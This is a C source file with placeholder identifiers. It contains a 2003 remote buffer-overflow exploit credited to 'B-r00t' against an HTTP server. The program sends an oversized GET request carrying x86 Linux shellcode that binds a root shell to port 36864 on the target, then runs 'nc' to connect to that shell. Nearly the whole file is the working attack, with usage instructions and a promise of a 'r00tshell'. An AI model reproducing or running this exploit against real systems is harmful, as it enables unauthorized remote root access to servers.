
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {char sin_zero; int sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int shellcode ;
typedef int buf ;


 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int,struct sockaddr*,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (char*,int *) ;
 int FUNC_5 (char*,char,int) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (int,char*,int,int ) ;
 int FUNC_9 (char*,char*,int) ;
 int FUNC_10 (int) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (char*,char*) ;
 int FUNC_13 (char*) ;
 int FUNC_14 (char*) ;

int FUNC_15 ( int VAR_5, char *VAR_6[] )
{


int VAR_7, VAR_8, VAR_9;
struct sockaddr_in VAR_10;
char *VAR_11 = "TARGET";
char VAR_12[2100], *VAR_13;

char VAR_14[] = "\xe8\xc5\xff\xbe\xe8\xc5\xff\xbe";
char VAR_15[] =
"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
"\x40\x89\xc3\x89\x46\x0c\x40\x89"
"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
"\x80\x43\xc6\x46\x10\x10\x88\x46"
"\x08\x31\xc0\x31\xd2\x89\x46\x18"
"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
"\x56\x10\xb0\x66\x43\xcd\x80\x86"
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
"\x80\x88\x56\x07\x89\x76\x0c\x87"
"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";


FUNC_7 ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003\n", VAR_2);

if (VAR_5 < 2)
{
        FUNC_7 ("\nUsage: %s [IP_ADDRESS]", VAR_2);
        FUNC_7 ("\nExample: %s 10.0.0.1 \n", VAR_2);
        FUNC_7 ("\nOn success a r00tshell will be spawned on port 36864.\n\n");
        FUNC_2 (-1);
}

FUNC_9 (VAR_11, VAR_6[1], 1);


FUNC_5 (VAR_12, '\0', sizeof (VAR_12));
VAR_13 = VAR_12;
FUNC_12 (VAR_12, "GET /");

for (VAR_8 = 1; VAR_8 < 2033-sizeof(VAR_15); VAR_8++)
FUNC_12 (VAR_12, VAR_3);

FUNC_12 (VAR_12, VAR_15);
FUNC_12 (VAR_12, VAR_14);
FUNC_12 (VAR_12, " HTTP/1.0");
FUNC_12 (VAR_12, "\x0D\x0A\x0D\x0A");


if ((VAR_7 = FUNC_11(VAR_0, VAR_4, 0)) == -1){
        FUNC_6("\nsocket error\n");
        FUNC_2 (1);
        }

VAR_10.sin_family = VAR_0;
VAR_10.sin_port = FUNC_3(VAR_1);
if (! FUNC_4(VAR_6[1], &(VAR_10.sin_addr))) {
        FUNC_6("inet_aton problems");
        FUNC_2 (2);
        }

FUNC_5( &(VAR_10.sin_zero), '\0', 8);

if (FUNC_1 (VAR_7, (struct sockaddr *)&VAR_10, sizeof (struct sockaddr)) == -1){
        FUNC_6("\nconnect failed\n");
        FUNC_0 (VAR_7);
        FUNC_2 (3);
        }


VAR_9 = (FUNC_8 (VAR_7, VAR_13, FUNC_13(VAR_12), 0));
if (VAR_9 == -1) {
        FUNC_6("\nsend error\n");
        FUNC_0 (VAR_7);
        FUNC_2(4);
        }
FUNC_0 (VAR_7);
if (VAR_9 < FUNC_13(VAR_12))
FUNC_7 ("\nNetwork Error - Full Payload Was NOT sent!");

FUNC_7 ("\n\nNumber of bytes sent: %d / %d\n", VAR_9, FUNC_13(VAR_12));
FUNC_7 ("\nUsing netcat 'nc' to get the r00tshell on port 36864 ...!\n");
FUNC_10 (3);
FUNC_14("nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'");
FUNC_2 (0);
}
